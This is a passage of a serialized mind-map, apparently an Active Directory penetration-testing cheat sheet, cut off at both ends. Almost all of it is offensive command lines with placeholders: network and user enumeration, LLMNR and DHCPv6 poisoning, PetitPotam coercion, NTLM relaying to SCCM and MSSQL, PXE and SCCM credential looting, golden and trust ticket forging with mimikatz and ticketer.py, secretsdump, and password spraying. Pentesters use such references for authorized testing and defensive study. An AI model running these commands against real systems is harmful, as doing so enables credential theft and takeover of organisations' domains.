-ip &lt;attacker_ip&gt;</code> &gt;&gt;&gt; ESC8","children":[],"payload":{"tag":"li","lines":"1727,1728"}}],"payload":{"tag":"li","lines":"1726,1728"}},{"content":"SMB -&gt; SMB","children":[{"content":"same as NTLM relay, use krbrelayx.py","children":[],"payload":{"tag":"li","lines":"1729,1730"}}],"payload":{"tag":"li","lines":"1728,1730"}},{"content":"SMB -&gt; LDAP(S)","children":[{"content":"same as NTLM relay, use krbrelayx.py","children":[],"payload":{"tag":"li","lines":"1731,1733"}}],"payload":{"tag":"li","lines":"1730,1733"}}],"payload":{"tag":"h3","lines":"1725,1726"}}],"payload":{"tag":"h2","lines":"1681,1682"}},{"content":"No Credentials","children":[{"content":"Scan network &gt;&gt;&gt; Vulnerable host","children":[{"content":"<code>nxc smb &lt;ip_range&gt;</code>","children":[],"payload":{"tag":"li","lines":"1736,1737"}},{"content":"<code>nmap -sP -p &lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1737,1738"}},{"content":"<code>nmap -Pn -sV --top-ports 50 --open &lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1738,1739"}},{"content":"<code>nmap -Pn --script smb-vuln* -p139,445 &lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1739,1740"}},{"content":"<code>nmap -Pn -sC -sV -oA &lt;output&gt; &lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1740,1741"}},{"content":"<code>nmap -Pn -sC -sV -p- -oA &lt;output&gt; &lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1741,1742"}},{"content":"<code>nmap -sU -sC -sV -oA &lt;output&gt; &lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1742,1744"}}],"payload":{"tag":"h3","lines":"1735,1736"}},{"content":"Find DC IP","children":[{"content":"<code>nmcli dev show &lt;interface&gt;</code>","children":[],"payload":{"tag":"li","lines":"1745,1746"}},{"content":"<code>nslookup -type=SRV _ldap._tcp.dc._msdcs.&lt;domain&gt;</code>","children":[],"payload":{"tag":"li","lines":"1746,1747"}},{"content":"<code>nmap -p 88 --open &lt;ip_range&gt;</code>","children":[],"payload":{"tag":"li","lines":"1747,1749"}}],"payload":{"tag":"h3","lines":"1744,1745"}},{"content":"Zone transfer","children":[{"content":"<code>dig axfr &lt;domain_name&gt; @&lt;name_server&gt;</code>","children":[],"payload":{"tag":"li","lines":"1750,1752"}}],"payload":{"tag":"h3","lines":"1749,1750"}},{"content":"Anonymous &amp; Guest access on SMB shares","children":[{"content":"<code>nxc smb &lt;ip_range&gt; -u &apos;&apos; -p &apos;&apos;</code>","children":[],"payload":{"tag":"li","lines":"1753,1754"}},{"content":"<code>nxc smb &lt;ip_range&gt; -u &apos;a&apos; -p &apos;&apos;</code>","children":[],"payload":{"tag":"li","lines":"1754,1755"}},{"content":"<code>enum4linux-ng.py -a -u &apos;&apos; -p &apos;&apos; &lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1755,1756"}},{"content":"<code>smbclient -U &apos;%&apos; -L //&lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1756,1758"}}],"payload":{"tag":"h3","lines":"1752,1753"}},{"content":"Enumerate LDAP &gt;&gt;&gt; Username","children":[{"content":"<code>nmap -n -sV --script &apos;ldap*&apos; and not brute -p 389 &lt;dc_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1759,1760"}},{"content":"<code>ldapsearch -x -H &lt;dc_ip&gt; -s base</code>","children":[],"payload":{"tag":"li","lines":"1760,1762"}}],"payload":{"tag":"h3","lines":"1758,1759"}},{"content":"Enumerate Users &gt;&gt;&gt; Username","children":[{"content":"<code>nxc smb &lt;dc_ip&gt; --users</code>","children":[],"payload":{"tag":"li","lines":"1763,1764"}},{"content":"<code>nxc smb &lt;dc_ip&gt; --rid-brute 10000 # bruteforcing RID</code>","children":[],"payload":{"tag":"li","lines":"1764,1765"}},{"content":"<code>net rpc group members &apos;Domain Users&apos; -W &apos;&lt;domain&gt; -l &lt;ip&gt; -U &apos;%&apos;</code>","children":[],"payload":{"tag":"li","lines":"1765,1767"}}],"payload":{"tag":"h3","lines":"1762,1763"}},{"content":"Bruteforce users &gt;&gt;&gt; Username","children":[{"content":"<code>kerbrute userenum -d &lt;domain&gt; &lt;userlist&gt;</code>","children":[],"payload":{"tag":"li","lines":"1768,1769"}},{"content":"<code>nmap -p 88 --script=krb5-enum-users --script-args=&quot;krb5-enum-users.realm= &apos;&lt;domain&gt;&apos;,userdb=&lt;user_list_file&gt;&quot; &lt;dc_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1769,1771"}}],"payload":{"tag":"h3","lines":"1767,1768"}},{"content":"Poisoning &gt;&gt;&gt; poisoning SMB || poisoning LDAP || poisoning HTTP","children":[{"content":"LLMNR / NBTNS / MDNS","children":[{"content":"<code>responder -l &lt;interface&gt;</code>","children":[],"payload":{"tag":"li","lines":"1773,1774"}}],"payload":{"tag":"li","lines":"1772,1774"}},{"content":"&#x26a0;&#xfe0f; DHCPv6 (IPv6 prefered to IPv4)","children":[{"content":"<code>mitm6 -d &lt;domain&gt;</code>","children":[],"payload":{"tag":"li","lines":"1775,1776"}},{"content":"<code>bettercap</code>","children":[],"payload":{"tag":"li","lines":"1776,1777"}}],"payload":{"tag":"li","lines":"1774,1777"}},{"content":"&#x26a0;&#xfe0f; ARP Poisoning","children":[{"content":"<code>bettercap</code>","children":[],"payload":{"tag":"li","lines":"1778,1779"}},{"content":"<code>asreqroast</code>","children":[{"content":"<code>Pcredz -i &lt;interface&gt; -v</code> &gt;&gt;&gt; Hash found ASREQ","children":[],"payload":{"tag":"li","lines":"1780,1782"}}],"payload":{"tag":"li","lines":"1779,1782"}}],"payload":{"tag":"li","lines":"1777,1782"}}],"payload":{"tag":"h3","lines":"1771,1772"}}],"payload":{"tag":"h2","lines":"1733,1734"}},{"content":"Coerce &gt;&gt;&gt; Coerce SMB","children":[{"content":"Unauthenticated PetitPotam (CVE-2022-26925) @CVE@","children":[{"content":"<code>petitpotam.py -d &lt;domain&gt; &lt;listener&gt; &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"1784,1786"}}],"payload":{"tag":"li","lines":"1783,1786"}}],"payload":{"tag":"h2","lines":"1782,1783"}},{"content":"PXE","children":[{"content":"no password &gt;&gt;&gt; Credentials (NAA account)","children":[{"content":"<code>pxethief.py 1</code>","children":[],"payload":{"tag":"li","lines":"1788,1789"}},{"content":"<code>pxethief.py 2 &lt;distribution_point_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1789,1790"}}],"payload":{"tag":"li","lines":"1787,1790"}},{"content":"password protected &gt;&gt;&gt; PXE Hash","children":[{"content":"<code>tftp -i &lt;dp_ip&gt; GET &quot;\\xxx\\boot.var&quot;</code>","children":[],"payload":{"tag":"li","lines":"1791,1792"}},{"content":"<code>pxethief.py 5 &apos;\\xxx\\boot.var&apos;</code>","children":[],"payload":{"tag":"li","lines":"1792,1794"}}],"payload":{"tag":"li","lines":"1790,1794"}}],"payload":{"tag":"h2","lines":"1786,1787"}},{"content":"TimeRoasting &gt;&gt;&gt; timeroast hash","children":[{"content":"<code>timeroast.py &lt;dc_ip&gt; -o &lt;output_log&gt;</code>","children":[],"payload":{"tag":"li","lines":"1795,1797"}}],"payload":{"tag":"h2","lines":"1794,1795"}},{"content":"SCCM","children":[{"content":"recon","children":[{"content":"<code>sccmhunter.py find -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -dc-ip &lt;dc_ip&gt; -debug</code>","children":[{"content":"<code>sccmhunter.py show -all</code>","children":[],"payload":{"tag":"li","lines":"1801,1802"}}],"payload":{"tag":"li","lines":"1800,1802"}},{"content":"<code>ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; sccm</code>","children":[],"payload":{"tag":"li","lines":"1802,1803"}},{"content":"<code>nxc smb &lt;sccm_server&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; --shares</code>","children":[],"payload":{"tag":"li","lines":"1803,1805"}}],"payload":{"tag":"h3","lines":"1799,1800"}},{"content":"Creds-1 No credentials &gt;&gt;&gt; NAA credentials || User + Pass","children":[{"content":"Extract from pxe See no creds &gt;&gt;&gt; PXE","children":[],"payload":{"tag":"li","lines":"1806,1808"}}],"payload":{"tag":"h3","lines":"1805,1806"}},{"content":"Elevate-1:Relay on site systems Simple user &gt;&gt;&gt; Admin on Site system","children":[{"content":"coerce sccm site server","children":[{"content":"<code>ntlmrelayx.py -tf &lt;site_systems&gt; -smb2support</code>","children":[],"payload":{"tag":"li","lines":"1810,1812"}}],"payload":{"tag":"li","lines":"1809,1812"}}],"payload":{"tag":"h3","lines":"1808,1809"}},{"content":"Elevate-2:Force client push Simple user &gt;&gt;&gt; Admin","children":[{"content":"<code>ntlmrelayx.py -t &lt;sccm_server&gt; -smb2support -socks # listen connection</code>","children":[{"content":"<code>SharpSCCM.exe invoke client-push -mp &lt;sccm_server&gt;.&lt;domain&gt; -sc &lt;site_code&gt; -t &lt;attacker_ip&gt; # Launch client push install</code>","children":[{"content":"<code>proxychains smbexec.py -no-pass &lt;domain&gt;/&lt;socks_user&gt;@&lt;sccm_server&gt;</code>","children":[{"content":"cleanup","children":[],"payload":{"tag":"li","lines":"1816,1818"}}],"payload":{"tag":"li","lines":"1815,1818"}}],"payload":{"tag":"li","lines":"1814,1818"}}],"payload":{"tag":"li","lines":"1813,1818"}}],"payload":{"tag":"h3","lines":"1812,1813"}},{"content":"Elevate-3:Automatic client push Simple user &gt;&gt;&gt; Relay ntlm","children":[{"content":"Create DNS A record for non existing computer x","children":[{"content":"<code>dnstool.py -u &apos;&lt;domain&gt;\\&lt;user&gt;&apos; -p &lt;pass&gt;  -r &lt;newcomputer&gt;.&lt;domain&gt; -a add -t A -d &lt;attacker_ip&gt; &lt;dc_ip&gt;</code>","children":[{"content":"Enroll new computer x in AD  then remove host SPN from the machine account","children":[],"payload":{"tag":"li","lines":"1821,1822"}},{"content":"<code>setspn -D host/&lt;newcomputer&gt; &lt;newcomputer&gt; setspn -D host/&lt;newcomputer&gt;.&lt;domain&gt; &lt;newcomputer&gt;</code>","children":[{"content":"wait 5m for client push","children":[{"content":"<code>ntlmrelayx.py -tf &lt;no_signing_target&gt; -smb2support -socks</code>","children":[{"content":"cleanup","children":[],"payload":{"tag":"li","lines":"1825,1827"}}],"payload":{"tag":"li","lines":"1824,1827"}}],"payload":{"tag":"li","lines":"1823,1827"}}],"payload":{"tag":"li","lines":"1822,1827"}}],"payload":{"tag":"li","lines":"1820,1827"}}],"payload":{"tag":"li","lines":"1819,1827"}}],"payload":{"tag":"h3","lines":"1818,1819"}},{"content":"CRED-6 Loot creds &gt;&gt;&gt; User + Pass","children":[{"content":"SCCM SMB service (445/TCP) on a DP","children":[{"content":"<code>cmloot.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;sccm_dp&gt; -cmlootinventory sccmfiles.txt</code>","children":[],"payload":{"tag":"li","lines":"1829,1830"}}],"payload":{"tag":"li","lines":"1828,1830"}},{"content":"SCCM HTTP service (80/TCP or 443/TCP) on a DP","children":[{"content":"<code>SCCMSecrets.py policies -mp http://&lt;management_point&gt; -u &apos;&lt;machine_account&gt;&#x24;&apos; -p &apos;&lt;machine_password&gt;&apos; -cn &apos;&lt;client_name&gt;&apos;</code>","children":[],"payload":{"tag":"li","lines":"1831,1832"}},{"content":"<code>SCCMSecrets.py files -dp http://&lt;distribution_point&gt; -u &apos;&lt;user&gt;&apos; -p &apos;&lt;password&gt;&apos;</code>","children":[],"payload":{"tag":"li","lines":"1832,1833"}},{"content":"<code>sccm-http-looter -server &lt;ip_dp&gt;</code>","children":[],"payload":{"tag":"li","lines":"1833,1835"}}],"payload":{"tag":"li","lines":"1830,1835"}}],"payload":{"tag":"h3","lines":"1827,1828"}},{"content":"Takeover-1:relay to mssql db Simple user &gt;&gt;&gt; SCCM ADMIN","children":[{"content":"SCCM MSSQL != SSCM server","children":[{"content":"<code>sccmhunter.py mssql -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -dc-ip &lt;dc_ip&gt; -debug -tu &lt;target_user&gt; -sc &lt;site_code&gt; -stacked</code>","children":[{"content":"<code>ntlmrelayx.py -smb2support -ts -t mssql://&lt;sccm_mssql&gt; -q &quot;&lt;query&gt;&quot;</code>","children":[{"content":"coerce sccm_mssql -&gt; attacker","children":[{"content":"<code>sccmhunter.py admin -u &lt;target_user&gt;@&lt;domain&gt; -p &apos;&lt;password&gt;&apos; -ip &lt;sccm_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1840,1842"}}],"payload":{"tag":"li","lines":"1839,1842"}}],"payload":{"tag":"li","lines":"1838,1842"}}],"payload":{"tag":"li","lines":"1837,1842"}}],"payload":{"tag":"li","lines":"1836,1842"}}],"payload":{"tag":"h3","lines":"1835,1836"}},{"content":"Takeover-2:relay to mssql server Simple user &gt;&gt;&gt; Admin MSSQL","children":[{"content":"SCCM MSSQL != SSCM server","children":[{"content":"<code>ntlmrelayx.py -t &lt;sccm_mssql&gt; -smb2support -socks</code>","children":[{"content":"coerce sccm_server","children":[{"content":"<code>proxychains smbexec.py -no-pass &lt;domain&gt;/&apos;&lt;sccm_server&gt;&#x24;&apos;@&lt;sccm_ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"1846,1848"}}],"payload":{"tag":"li","lines":"1845,1848"}}],"payload":{"tag":"li","lines":"1844,1848"}}],"payload":{"tag":"li","lines":"1843,1848"}}],"payload":{"tag":"h3","lines":"1842,1843"}},{"content":"Creds-2:Policy Request Credentials Simple user &gt;&gt;&gt; User + Pass","children":[{"content":"add computer","children":[{"content":"<code>sccmwtf.py newcomputer newcomputer.&lt;domain&gt; &lt;target&gt; &apos;&lt;domain&gt;\\&lt;computer_added&gt;&#x24;&apos; &apos;&lt;computer_pass&gt;&apos;</code>","children":[{"content":"get NetworkAccessUsername and NetworkAccessPassword","children":[{"content":"<code>policysecretunobfuscate.py</code>","children":[{"content":"delete device created after sccmadmin","children":[],"payload":{"tag":"li","lines":"1853,1854"}}],"payload":{"tag":"li","lines":"1852,1854"}}],"payload":{"tag":"li","lines":"1851,1854"}}],"payload":{"tag":"li","lines":"1850,1854"}},{"content":"<code>SharpSCCM.exe get secrets -r newcomputer -u &lt;computer_added&gt;&#x24; -p &lt;computer_pass&gt;&quot;</code>","children":[{"content":"cleanup","children":[],"payload":{"tag":"li","lines":"1855,1857"}}],"payload":{"tag":"li","lines":"1854,1857"}}],"payload":{"tag":"li","lines":"1849,1857"}}],"payload":{"tag":"h3","lines":"1848,1849"}},{"content":"Creds-3Creds-4 Computer Admin user &gt;&gt;&gt; NAA credentials","children":[{"content":"<code>dploot.py sccm -u &lt;admin&gt; -p &apos;&lt;password&gt;&apos; &lt;sccm_target&gt;</code>","children":[],"payload":{"tag":"li","lines":"1858,1859"}},{"content":"<code>sccmhunter.py dpapi  -u &lt;admin&gt; -p &apos;&lt;password&gt;&apos; -target &lt;sccm_target&gt; -debug</code>","children":[],"payload":{"tag":"li","lines":"1859,1860"}},{"content":"<code>SharpSCCM.exe local secrets -m disk</code>","children":[],"payload":{"tag":"li","lines":"1860,1861"}},{"content":"<code>SharpSCCM.exe local secrets -m wmi</code>","children":[],"payload":{"tag":"li","lines":"1861,1863"}}],"payload":{"tag":"h3","lines":"1857,1858"}},{"content":"Creds-5 SCCM admin &gt;&gt;&gt; Site DB credentials","children":[{"content":"<code>secretsdump.py &lt;domain&gt;/&lt;admin&gt;:&apos;&lt;pass&gt;&apos;@&lt;sccm_target&gt;</code>","children":[{"content":"<code>mssqlclient.py -windows-auth -hashes &apos;&lt;sccm_target_hashNT&gt;&apos; &apos;&lt;domain&gt;/&lt;sccm_target&gt;&#x24;&apos;@&lt;sccm_mssql&gt;</code>","children":[{"content":"<code>use CM_&lt;site_code&gt;;</code>","children":[{"content":"<code>SELECT * FROM SC_UserAccount;</code>","children":[{"content":"<code>sccmdecryptpoc.exe &lt;cyphered_value&gt;</code>","children":[],"payload":{"tag":"li","lines":"1868,1870"}}],"payload":{"tag":"li","lines":"1867,1870"}}],"payload":{"tag":"li","lines":"1866,1870"}}],"payload":{"tag":"li","lines":"1865,1870"}}],"payload":{"tag":"li","lines":"1864,1870"}}],"payload":{"tag":"h3","lines":"1863,1864"}},{"content":"EXEC-1/2 SCCM admin &gt;&gt;&gt; lat","children":[{"content":"<code>SharpSCCM.exe exec -p &lt;binary&gt; -d &lt;device_name&gt; -sms &lt;SMS_PROVIDER&gt; -sc &lt;SITECODE&gt; --no-banner</code>","children":[],"payload":{"tag":"li","lines":"1871,1872"}},{"content":"<code>sccmhunter.py admin -u &lt;user&gt;@&lt;domain&gt; -p &apos;&lt;password&gt;&apos; -ip &lt;sccm_ip&gt;</code>","children":[{"content":"<code>get_device &lt;hostname&gt;</code>","children":[{"content":"<code>interact &lt;device_id&gt;</code>","children":[{"content":"<code>script xploit.ps1</code>","children":[],"payload":{"tag":"li","lines":"1875,1877"}}],"payload":{"tag":"li","lines":"1874,1877"}}],"payload":{"tag":"li","lines":"1873,1877"}}],"payload":{"tag":"li","lines":"1872,1877"}}],"payload":{"tag":"h3","lines":"1870,1871"}},{"content":"Cleanup","children":[{"content":"<code>SharpSCCM.exe get devices -sms &lt;SMS_PROVIDER&gt; -sc &lt;SITECODE&gt; -n &lt;NTLMRELAYX_LISTENER_IP&gt; -p &quot;Name&quot; -p &quot;ResourceId&quot; -p &quot;SMSUniqueIdentifier&quot;</code>","children":[{"content":"<code>SharpSCCM.exe remove device GUID:&lt;GUID&gt; -sms &lt;SMS_PROVIDER&gt; -sc &lt;SITECODE&gt;</code>","children":[],"payload":{"tag":"li","lines":"1879,1881"}}],"payload":{"tag":"li","lines":"1878,1881"}}],"payload":{"tag":"h3","lines":"1877,1878"}},{"content":"Post exploit","children":[{"content":"as sccm admin","children":[{"content":"<code>SCCMHound.exe --server &lt;server&gt; --sitecode &lt;sitecode&gt;</code> &gt;&gt;&gt; Users sessions","children":[],"payload":{"tag":"li","lines":"1883,1885"}}],"payload":{"tag":"li","lines":"1882,1885"}}],"payload":{"tag":"h3","lines":"1881,1882"}}],"payload":{"tag":"h2","lines":"1797,1798"}},{"content":"Trusts","children":[{"content":"Enumeration","children":[{"content":"<code>nltest.exe /trusted_domains</code>","children":[],"payload":{"tag":"li","lines":"1888,1889"}},{"content":"<code>([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</code>","children":[],"payload":{"tag":"li","lines":"1889,1890"}},{"content":"<code>Get-DomainTrust -Domain &lt;domain&gt;</code>","children":[],"payload":{"tag":"li","lines":"1890,1891"}},{"content":"<code>Get-DomainTrustMapping</code>","children":[],"payload":{"tag":"li","lines":"1891,1892"}},{"content":"<code>ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; trusts</code>","children":[],"payload":{"tag":"li","lines":"1892,1893"}},{"content":"<code>sharphound.exe -c trusts -d &lt;domain&gt;</code>","children":[{"content":"<code>MATCH p=(:Domain)-[:TrustedBy]-&gt;(:Domain) RETURN p</code>","children":[],"payload":{"tag":"li","lines":"1894,1895"}}],"payload":{"tag":"li","lines":"1893,1895"}},{"content":"Get Domains SID","children":[{"content":"<code>Get-DomainSID -Domain &lt;domain&gt; Get-DomainSID -Domain &lt;target_domain&gt;</code>","children":[],"payload":{"tag":"li","lines":"1896,1897"}},{"content":"<code>lookupsid.py -domain-sids &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;&apos;@&lt;dc&gt; 0 lookupsid.py -domain-sids &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;&apos;@&lt;target_dc&gt; 0</code>","children":[],"payload":{"tag":"li","lines":"1897,1899"}}],"payload":{"tag":"li","lines":"1895,1899"}}],"payload":{"tag":"h3","lines":"1887,1888"}},{"content":"Child-&gt;Parent","children":[{"content":"\n<p data-lines=\"1900,1901\">Trust Key &gt;&gt;&gt; PassTheTicket</p>","children":[{"content":"<code>mimikatz lsadump::trust /patch</code>","children":[{"content":"<code>mimikatz kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;domain_sid&gt; /aes256:&lt;trust_key_aes256&gt; /sids:&lt;target_domain_sid&gt;-519 /service:krbtgt /target:&lt;target_domain&gt; /ptt</code>","children":[],"payload":{"tag":"li","lines":"1902,1903"}}],"payload":{"tag":"li","lines":"1901,1903"}},{"content":"<code>secretsdump.py -just-dc-user &apos;&lt;parent_domain&gt;&#x24;&apos;   &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;dc_ip&gt;</code>","children":[{"content":"<code>ticketer.py -nthash &lt;trust_key&gt; -domain-sid &lt;child_sid&gt; -domain &lt;child_domain&gt; -extra-sid &lt;parent_sid&gt;-519 -spn krbtgt/&lt;parent_domain&gt; trustfakeuser</code>","children":[],"payload":{"tag":"li","lines":"1904,1906"}}],"payload":{"tag":"li","lines":"1903,1906"}}],"payload":{"tag":"li","lines":"1900,1906"}},{"content":"\n<p data-lines=\"1906,1907\">Golden Ticket &gt;&gt;&gt; PassTheTicket</p>","children":[{"content":"<code>mimikatz lsadump::dcsync /domain:&lt;domain&gt; /user:&lt;domain&gt;\\krbtgt</code>","children":[{"content":"<code>mimikatz kerberos::golden /user:Administrator /krbtgt:&lt;HASH_KRBTGT&gt; /domain:&lt;domain&gt; /sid:&lt;user_sid&gt; /sids:&lt;RootDomainSID-519&gt; /ptt</code>","children":[],"payload":{"tag":"li","lines":"1908,1909"}}],"payload":{"tag":"li","lines":"1907,1909"}},{"content":"<code>raiseChild.py &lt;child_domain&gt;/&lt;user&gt;:&lt;password&gt;</code>","children":[],"payload":{"tag":"li","lines":"1909,1910"}},{"content":"<code>ticketer.py -nthash &lt;child_krbtgt_hash&gt; -domain-sid &lt;child_sid&gt; -domain &lt;child_domain&gt; -extra-sid &lt;parent_sid&gt;-519 goldenuser</code>","children":[],"payload":{"tag":"li","lines":"1910,1912"}}],"payload":{"tag":"li","lines":"1906,1912"}},{"content":"\n<p data-lines=\"1912,1913\">Unconstrained delegation</p>","children":[{"content":"coerce parent_dc on child_dc domain &gt;&gt;&gt; unconstrained delegation","children":[],"payload":{"tag":"li","lines":"1913,1915"}}],"payload":{"tag":"li","lines":"1912,1915"}}],"payload":{"tag":"h3","lines":"1899,1900"}},{"content":"Parent-&gt;Child","children":[{"content":"same as Child to parent","children":[],"payload":{"tag":"li","lines":"1916,1918"}}],"payload":{"tag":"h3","lines":"1915,1916"}},{"content":"External Trust","children":[{"content":"\n<p data-lines=\"1919,1920\">DomainA &lt;--&gt; DomainB trust (B trust A, A trust B)</p>","children":[{"content":"from A to B FOREST_TRANSITIVE","children":[{"content":"password reuse &gt;&gt;&gt; lat move (creds/pth/...)","children":[],"payload":{"tag":"li","lines":"1921,1922"}},{"content":"Foreign group and users &gt;&gt;&gt; ACL","children":[{"content":"Users with foreign Domain Group Membership","children":[{"content":"<code>MATCH p=(n:User {domain:&quot;&lt;DOMAIN.FQDN&gt;&quot;})-[:MemberOf]-&gt;(m:Group) WHERE m.domain&lt;&gt;n.domain RETURN p</code>","children":[],"payload":{"tag":"li","lines":"1924,1925"}}],"payload":{"tag":"li","lines":"1923,1925"}},{"content":"Group with foreign Domain Group Membership","children":[{"content":"<code>MATCH p=(n:Group {domain:&quot;&lt;DOMAIN.FQDN&gt;&quot;})-[:MemberOf]-&gt;(m:Group) WHERE m.domain&lt;&gt;n.domain RETURN p</code>","children":[],"payload":{"tag":"li","lines":"1926,1927"}}],"payload":{"tag":"li","lines":"1925,1927"}}],"payload":{"tag":"li","lines":"1922,1927"}},{"content":"SID History on B &gt;&gt;&gt; PassTheTicket","children":[{"content":"Golden ticket","children":[{"content":"<code>mimikatz lsadump::dcsync /domain:&lt;domain&gt; /user:&lt;domain&gt;\\krbtgt</code>","children":[{"content":"<code>mimikatz kerberos::golden /user:Administrator /krbtgt:&lt;HASH_KRBTGT&gt; /domain:&lt;domain&gt; /sid:&lt;user_sid&gt; /sids:&lt;RootDomainSID&gt;-&lt;GROUP_SID_SUP_1000&gt; /ptt</code>","children":[],"payload":{"tag":"li","lines":"1930,1931"}}],"payload":{"tag":"li","lines":"1929,1931"}},{"content":"<code>ticketer.py -nthash &lt;krbtgt&gt; -domain-sid &lt;domain_a&gt; -domain &lt;domain_a&gt; -extra-sid &lt;domain_b_sid&gt;-&lt;group_sid sup 1000&gt; fakeuser</code>","children":[],"payload":{"tag":"li","lines":"1931,1932"}}],"payload":{"tag":"li","lines":"1928,1932"}},{"content":"Trust ticket","children":[{"content":"<code>secretsdump.py -just-dc-user &apos;&lt;domainB&gt;&apos; &lt;domainA&gt;/&lt;user&gt;:&apos;&lt;password&gt;&apos;@&lt;dc_a&gt;</code>","children":[{"content":"<code>ticketer.py -nthash &lt;trust_hash&gt; -domain-sid &lt;sid_a&gt; -domain &lt;domain_a&gt; -extra-sid &lt;domain_b_sid&gt;-&lt;group_sid sup 1000&gt; -spn krbtgt/&lt;domain_a&gt; fakeuser</code>","children":[],"payload":{"tag":"li","lines":"1934,1935"}}],"payload":{"tag":"li","lines":"1933,1935"}}],"payload":{"tag":"li","lines":"1932,1935"}}],"payload":{"tag":"li","lines":"1927,1935"}},{"content":"ADCS abuse &gt;&gt;&gt; ADCS","children":[],"payload":{"tag":"li","lines":"1935,1936"}}],"payload":{"tag":"li","lines":"1920,1936"}},{"content":"from A to B is FOREST_TRANSITIVE|TREAT_AS_EXTERNAL","children":[{"content":"Unconstrained delegation","children":[{"content":"coerce dc_b on dc_a &gt;&gt;&gt; unconstrained delegation","children":[],"payload":{"tag":"li","lines":"1938,1940"}}],"payload":{"tag":"li","lines":"1937,1940"}}],"payload":{"tag":"li","lines":"1936,1940"}}],"payload":{"tag":"li","lines":"1919,1940"}},{"content":"\n<p data-lines=\"1940,1941\">DomainA &lt;-- DomainB trust (B trust A / A access B)</p>","children":[{"content":"Same as double trust, but no unconstrained delegation as B can&apos;t connect to A","children":[],"payload":{"tag":"li","lines":"1941,1943"}}],"payload":{"tag":"li","lines":"1940,1943"}},{"content":"\n<p data-lines=\"1943,1944\">DomainA --&gt; DomainB trust (A trust B / B access A)</p>","children":[{"content":"password reuse &gt;&gt;&gt; lat move (creds/pth/...)","children":[],"payload":{"tag":"li","lines":"1944,1946"}}],"payload":{"tag":"li","lines":"1943,1946"}}],"payload":{"tag":"h3","lines":"1918,1919"}},{"content":"Mssql links-&gt; MSSQL","children":[{"content":"MSSQL trusted links doesn&apos;t care of trust link","children":[{"content":"<code>Get-SQLServerLinkCrawl -username &lt;user&gt; -password &lt;pass&gt; -Verbose -Instance &lt;sql_instance&gt;</code>","children":[],"payload":{"tag":"li","lines":"1948,1949"}},{"content":"<code>mssqlclient.py -windows-auth &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code>","children":[{"content":"trustlink","children":[{"content":"sp_linkedservers","children":[{"content":"use_link","children":[],"payload":{"tag":"li","lines":"1952,1954"}}],"payload":{"tag":"li","lines":"1951,1954"}}],"payload":{"tag":"li","lines":"1950,1954"}}],"payload":{"tag":"li","lines":"1949,1954"}}],"payload":{"tag":"li","lines":"1947,1954"}}],"payload":{"tag":"h3","lines":"1946,1947"}}],"payload":{"tag":"h2","lines":"1885,1886"}},{"content":"Valid user (no password)","children":[{"content":"Password Spray","children":[{"content":"Get password policy  (you need creds,but you should get the policy  first to avoid locking accounts)","children":[{"content":"default policy","children":[{"content":"<code>nxc smb &lt;dc_ip&gt; -u &apos;&lt;user&gt;&apos; -p &apos;&lt;password&gt;&apos; --pass-pol</code><br>\n<a href=\"https://www.thehacker.recipes/ad/recon/password-policy\">https://www.thehacker.recipes/ad/recon/password-policy</a>","children":[],"payload":{"tag":"li","lines":"1959,1961"}},{"content":"<code>Get-ADDefaultDomainPasswordPolicy</code>","children":[],"payload":{"tag":"li","lines":"1961,1962"}},{"content":"<code>ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; domain_policy</code>","children":[],"payload":{"tag":"li","lines":"1962,1963"}}],"payload":{"tag":"li","lines":"1958,1963"}},{"content":"Fined Policy (Privileged)","children":[{"content":"<code>ldapsearch-ad.py --server &lt;dc&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt; --type pass-pols</code>","children":[],"payload":{"tag":"li","lines":"1964,1965"}},{"content":"<code>Get-ADFineGainedPasswordPolicy -filter *</code>","children":[],"payload":{"tag":"li","lines":"1965,1966"}},{"content":"<code>ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; pso # can also be runned with a low priv account but less information will be available</code>","children":[],"payload":{"tag":"li","lines":"1966,1967"}}],"payload":{"tag":"li","lines":"1963,1967"}}],"payload":{"tag":"li","lines":"1957,1967"}},{"content":"&#x26a0;&#xfe0f; user == password &gt;&gt;&gt; Clear text Credentials","children":[{"content":"<code>nxc smb &lt;dc_ip&gt; -u &lt;users.txt&gt; -p &lt;passwords.txt&gt; --no-bruteforce --continue-on-success</code>","children":[],"payload":{"tag":"li","lines":"1968,1969"}},{"content":"<code>sprayhound -U &lt;users.txt&gt; -d &lt;domain&gt; -dc  &lt;dc_ip&gt;   # add --lower to lowercase and --upper to uppercase. Add nothing to get only user=pass</code>","children":[],"payload":{"tag":"li","lines":"1969,1970"}}],"payload":{"tag":"li","lines":"1967,1970"}},{"content":"&#x26a0;&#xfe0f; usuals passwords  (SeasonYear!, Company123, ...) &gt;&gt;&gt; Clear text 